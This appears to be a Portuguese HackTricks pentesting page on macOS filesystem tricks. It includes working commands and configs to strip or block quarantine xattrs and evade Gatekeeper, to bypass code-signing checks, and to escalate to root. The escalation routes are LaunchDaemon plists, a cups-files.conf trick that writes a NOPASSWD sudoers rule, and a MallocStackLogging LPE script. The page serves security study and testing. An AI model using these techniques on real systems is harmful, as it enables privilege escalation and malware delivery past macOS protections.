# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## Combinações de permissões POSIX

Permissões em um **diretório**:

- **leitura** - você pode **enumerar** as entradas do diretório
- **escrita** - você pode **deletar/escrever** **arquivos** no diretório e pode **deletar pastas vazias**.
- Mas você **não pode deletar/modificar pastas não vazias** a menos que tenha permissões de escrita sobre elas.
- Você **não pode modificar o nome de uma pasta** a menos que a possua.
- **execução** - você está **autorizado a percorrer** o diretório - se você não tiver esse direito, não pode acessar nenhum arquivo dentro dele, ou em subdiretórios.

### Combinações Perigosas

**Como sobrescrever um arquivo/pasta de propriedade do root**, mas:

- Um **proprietário de diretório pai** no caminho é o usuário
- Um **proprietário de diretório pai** no caminho é um **grupo de usuários** com **acesso de escrita**
- Um **grupo** de usuários tem **acesso de escrita** ao **arquivo**

Com qualquer uma das combinações anteriores, um atacante poderia **injetar** um **link simbólico/duro** no caminho esperado para obter uma escrita arbitrária privilegiada.

### Caso especial de pasta root R+X

Se houver arquivos em um **diretório** onde **apenas o root tem acesso R+X**, esses **não são acessíveis a mais ninguém**. Portanto, uma vulnerabilidade que permita **mover um arquivo legível por um usuário**, que não pode ser lido por causa dessa **restrição**, deste diretório **para outro diferente**, poderia ser abusada para ler esses arquivos.

Exemplo em: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Link Simbólico / Link Duro

### Arquivo/Pasta permissiva

Se um processo privilegiado estiver escrevendo dados em um **arquivo** que poderia ser **controlado** por um **usuário de menor privilégio**, ou que poderia ter sido **criado anteriormente** por um usuário de menor privilégio. O usuário poderia simplesmente **apontá-lo para outro arquivo** via um link simbólico ou duro, e o processo privilegiado escreverá nesse arquivo.

Verifique nas outras seções onde um atacante poderia **abusar de uma escrita arbitrária para escalar privilégios**.

### Abrir `O_NOFOLLOW`

A flag `O_NOFOLLOW` quando usada pela função `open` não seguirá um symlink no último componente do caminho, mas seguirá o restante do caminho. A maneira correta de evitar seguir symlinks no caminho é usando a flag `O_NOFOLLOW_ANY`.

## .fileloc

Arquivos com extensão **`.fileloc`** podem apontar para outros aplicativos ou binários, então quando são abertos, o aplicativo/binário será o que será executado.\
Exemplo:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Descritores de Arquivo

### Vazamento de FD (sem `O_CLOEXEC`)

Se uma chamada para `open` não tiver a flag `O_CLOEXEC`, o descritor de arquivo será herdado pelo processo filho. Assim, se um processo privilegiado abrir um arquivo privilegiado e executar um processo controlado pelo atacante, o atacante **herdará o FD sobre o arquivo privilegiado**.

Se você conseguir fazer um **processo abrir um arquivo ou uma pasta com altos privilégios**, você pode abusar do **`crontab`** para abrir um arquivo em `/etc/sudoers.d` com **`EDITOR=exploit.py`**, assim o `exploit.py` obterá o FD para o arquivo dentro de `/etc/sudoers` e abusará dele.

Por exemplo: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098), código: https://github.com/gergelykalman/CVE-2023-32428-a-macOS-LPE-via-MallocStackLogging

## Evitar truques de xattrs de quarentena

### Remover isso
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Se um arquivo/pasta tiver este atributo imutável, não será possível colocar um xattr nele.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs mount

Uma montagem **devfs** **não suporta xattr**, mais informações em [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Este ACL impede a adição de `xattrs` ao arquivo.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

O formato de arquivo **AppleDouble** copia um arquivo incluindo seus ACEs.

No [**código-fonte**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) é possível ver que a representação de texto da ACL armazenada dentro do xattr chamado **`com.apple.acl.text`** será definida como ACL no arquivo descompactado. Portanto, se você compactou um aplicativo em um arquivo zip com o formato de arquivo **AppleDouble** com uma ACL que impede que outros xattrs sejam escritos nele... o xattr de quarentena não foi definido no aplicativo:

Verifique o [**relatório original**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) para mais informações.

Para replicar isso, primeiro precisamos obter a string acl correta:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note que mesmo que isso funcione, o sandbox escreve o xattr de quarentena antes)

Não é realmente necessário, mas deixo aqui só por precaução:

{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass de verificações de assinatura

### Bypass de verificações de binários da plataforma

Algumas verificações de segurança checam se o binário é um **binário da plataforma**, por exemplo, para permitir a conexão a um serviço XPC. No entanto, como exposto em um bypass em https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, é possível contornar essa verificação obtendo um binário da plataforma (como /bin/ls) e injetando o exploit via dyld usando uma variável de ambiente `DYLD_INSERT_LIBRARIES`.

### Bypass das flags `CS_REQUIRE_LV` e `CS_FORCED_LV`

É possível que um binário em execução modifique suas próprias flags para contornar verificações com um código como:
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Bypass Code Signatures

Bundles contém o arquivo **`_CodeSignature/CodeResources`** que contém o **hash** de cada **arquivo** no **bundle**. Note que o hash de CodeResources também está **embutido no executável**, então não podemos mexer com isso, também.

No entanto, existem alguns arquivos cuja assinatura não será verificada, estes têm a chave omit no plist, como:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
É possível calcular a assinatura de um recurso a partir da linha de comando com:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Montar dmgs

Um usuário pode montar um dmg personalizado criado até mesmo em cima de algumas pastas existentes. É assim que você pode criar um pacote dmg personalizado com conteúdo personalizado:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Normalmente, o macOS monta discos conversando com o serviço Mach `com.apple.DiskArbitration.diskarbitrationd` (fornecido por `/usr/libexec/diskarbitrationd`). Se você adicionar o parâmetro `-d` ao arquivo plist do LaunchDaemons e reiniciar, ele armazenará logs em `/var/log/diskarbitrationd.log`.\
No entanto, é possível usar ferramentas como `hdik` e `hdiutil` para se comunicar diretamente com o kext `com.apple.driver.DiskImages`.

## Escritas Arbitrárias

### Scripts sh periódicos

Se seu script puder ser interpretado como um **shell script**, você poderá sobrescrever o **`/etc/periodic/daily/999.local`** shell script que será acionado todos os dias.

Você pode **fingir** uma execução deste script com: **`sudo periodic daily`**

### Daemons

Escreva um **LaunchDaemon** arbitrário como **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** com um plist executando um script arbitrário como:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Just generate the script `/Applications/Scripts/privesc.sh` com os **comandos** que você gostaria de executar como root.

### Sudoers File

Se você tiver **escrita arbitrária**, você poderia criar um arquivo dentro da pasta **`/etc/sudoers.d/`** concedendo a si mesmo privilégios de **sudo**.

### PATH files

O arquivo **`/etc/paths`** é um dos principais lugares que preenche a variável de ambiente PATH. Você deve ser root para sobrescrevê-lo, mas se um script de **processo privilegiado** estiver executando algum **comando sem o caminho completo**, você pode ser capaz de **sequestrá-lo** modificando este arquivo.

Você também pode escrever arquivos em **`/etc/paths.d`** para carregar novas pastas na variável de ambiente `PATH`.

### cups-files.conf

Esta técnica foi usada em [this writeup](https://www.kandji.io/blog/macos-audit-story-part1).

Crie o arquivo `/etc/cups/cups-files.conf` com o seguinte conteúdo:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Isto criará o arquivo `/etc/sudoers.d/lpe` com permissões 777. O lixo extra no final é para acionar a criação do log de erros.

Em seguida, escreva em `/etc/sudoers.d/lpe` a configuração necessária para escalar privilégios como `%staff ALL=(ALL) NOPASSWD:ALL`.

Depois, modifique o arquivo `/etc/cups/cups-files.conf` novamente indicando `LogFilePerm 700` para que o novo arquivo sudoers se torne válido ao invocar `cupsctl`.

### Sandbox Escape

É possível escapar do sandbox do macOS com uma gravação arbitrária de FS. Para alguns exemplos, verifique a página [macOS Auto Start](../../../../macos-auto-start-locations.md), mas um comum é escrever um arquivo de preferências do Terminal em `~/Library/Preferences/com.apple.Terminal.plist` que executa um comando na inicialização e chamá-lo usando `open`.

## Gerar arquivos graváveis como outros usuários

Isto gerará um arquivo que pertence ao root e que é gravável por mim ([**código daqui**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). Isso também pode funcionar como privesc:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## Memória Compartilhada POSIX

**Memória compartilhada POSIX** permite que processos em sistemas operacionais compatíveis com POSIX acessem uma área de memória comum, facilitando uma comunicação mais rápida em comparação com outros métodos de comunicação entre processos. Envolve a criação ou abertura de um objeto de memória compartilhada com `shm_open()`, definindo seu tamanho com `ftruncate()`, e mapeando-o no espaço de endereços do processo usando `mmap()`. Os processos podem então ler e escrever diretamente nesta área de memória. Para gerenciar o acesso concorrente e prevenir a corrupção de dados, mecanismos de sincronização como mutexes ou semáforos são frequentemente utilizados. Finalmente, os processos desmapeiam e fecham a memória compartilhada com `munmap()` e `close()`, e opcionalmente removem o objeto de memória com `shm_unlink()`. Este sistema é especialmente eficaz para IPC eficiente e rápido em ambientes onde múltiplos processos precisam acessar dados compartilhados rapidamente.

<details>

<summary>Exemplo de Código do Produtor</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Exemplo de Código do Consumidor</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## Descritores Protegidos do macOS

**Descritores protegidos do macOS** são um recurso de segurança introduzido no macOS para aumentar a segurança e a confiabilidade das **operações de descritores de arquivo** em aplicativos de usuário. Esses descritores protegidos fornecem uma maneira de associar restrições específicas ou "guardas" com descritores de arquivo, que são aplicadas pelo kernel.

Esse recurso é particularmente útil para prevenir certas classes de vulnerabilidades de segurança, como **acesso não autorizado a arquivos** ou **condições de corrida**. Essas vulnerabilidades ocorrem quando, por exemplo, uma thread está acessando uma descrição de arquivo, dando **acesso a outra thread vulnerável** ou quando um descritor de arquivo é **herdado** por um processo filho vulnerável. Algumas funções relacionadas a essa funcionalidade são:

- `guarded_open_np`: Abre um FD com uma guarda
- `guarded_close_np`: Fecha-o
- `change_fdguard_np`: Altera as flags de guarda em um descritor (até removendo a proteção de guarda)

## Referências

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)

{{#include ../../../../banners/hacktricks-training.md}}
